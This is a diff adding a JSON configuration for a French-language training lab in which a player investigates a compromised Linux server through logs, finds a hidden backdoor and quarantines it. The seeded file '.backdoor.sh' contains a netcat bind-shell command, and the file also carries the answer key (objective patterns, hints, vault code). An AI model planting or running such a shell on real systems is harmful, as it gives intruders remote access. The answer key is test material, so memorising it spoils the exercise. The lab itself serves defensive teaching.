@@ -1,0 +1,55 @@
+{
+  "id": "lab-intrusion",
+  "kind": "lab",
+  "language": "bash",
+  "order": 0,
+  "title": "Intrusion — Le Serveur Compromis",
+  "tagline": "Un serveur Linux est compromis. Enquête dans un vrai terminal, neutralise l'attaquant et verrouille le système.",
+  "accent": "#e879f9",
+  "threatMax": 100,
+  "story": "**03:14.** Une alerte : un serveur Linux de l'entreprise est **compromis**. Tu as un accès terminal direct à la machine.\n\nLe niveau de **menace est à 100%**. Mène l'enquête, récupère les **4 fragments** du code de verrouillage en résolvant les objectifs, puis **compose le code** dans le coffre pour bannir l'attaquant.\n\n*Astuce : `ls` puis `ls -a` pour voir les fichiers (même cachés), `cat fichier` pour lire, `grep MOT fichier` pour filtrer.*",
+  "seedFiles": {
+    "auth.log": "10.0.0.42 OK admin\n185.220.101.5 FAIL root\n10.0.0.42 OK admin\n185.220.101.5 FAIL root\n203.0.113.9 OK alice\n185.220.101.5 FAIL root",
+    "siem.log": "2026-06-19 03:15 DENIED user=root ip=185.220.101.5\n2026-06-19 03:16 ACCEPTED user=j.martin ip=185.220.101.5\n2026-06-19 03:17 EXEC user=j.martin cmd=download",
+    ".backdoor.sh": "#!/bin/sh\n# backdoor installee par l'attaquant\nnc -l -p 4444 -e /bin/sh"
+  },
+  "objectives": [
+    {
+      "id": "o1",
+      "label": "**Trouver l'IP de l'attaquant** dans `auth.log` (celle des échecs de connexion `FAIL`).",
+      "detect": "185\\.220\\.101\\.5",
+      "hint": "`grep FAIL auth.log`",
+      "fragment": "4",
+      "reward": "**185.220.101.5** — un nœud de sortie Tor. C'est lui qui martelait le serveur."
+    },
+    {
+      "id": "o2",
+      "label": "**Identifier le compte compromis** : quel utilisateur s'est connecté avec succès depuis cette IP ? (regarde `siem.log`)",
+      "detect": "j\\.martin",
+      "hint": "`grep ACCEPTED siem.log`",
+      "fragment": "2",
+      "reward": "Le compte **j.martin** a été utilisé pour se connecter (`ACCEPTED`) puis lancer un téléchargement. Son mot de passe est tombé."
+    },
+    {
+      "id": "o3",
+      "label": "**Localiser le malware** : l'attaquant a déposé un fichier caché. Trouve-le.",
+      "detect": "backdoor",
+      "hint": "Les fichiers cachés commencent par un point : `ls -a` ou `find . -name \"*.sh\"`",
+      "fragment": "7",
+      "reward": "Un fichier caché **`.backdoor.sh`** — une porte dérobée qui ouvre un shell réseau. À neutraliser."
+    },
+    {
+      "id": "o4",
+      "label": "**Mettre le malware en quarantaine** : déplace `.backdoor.sh` dans `/tmp/quarantaine/`, puis affiche `QUARANTAINE_OK` pour confirmer.",
+      "detect": "QUARANTAINE_OK",
+      "hint": "`mkdir -p /tmp/quarantaine && mv .backdoor.sh /tmp/quarantaine/ && echo QUARANTAINE_OK`",
+      "fragment": "1",
+      "reward": "Backdoor isolée. Le serveur est presque sécurisé — il ne reste qu'à **verrouiller** l'accès."
+    }
+  ],
+  "vault": {
+    "code": "4271",
+    "prompt": "Compose le **code de verrouillage** à partir des 4 fragments collectés (dans l'ordre des objectifs) pour bannir l'attaquant."
+  },
+  "finale": "## Serveur sécurisé — Menace neutralisée\n\nTu as mené une intervention complète **dans un vrai terminal Linux** :\n\n- **Analyse de logs** (`grep`, `cat`) pour identifier l'IP hostile et le compte compromis\n- **Chasse au fichier caché** (`ls -a`, `find`) pour débusquer la backdoor\n- **Remédiation** (`mkdir`, `mv`) pour mettre le malware en quarantaine\n- **Verrouillage** : code reconstitué, attaquant banni\n\nC'est exactement le réflexe d'un analyste SOC / sysadmin face à une intrusion. **Bien joué.**"
+}
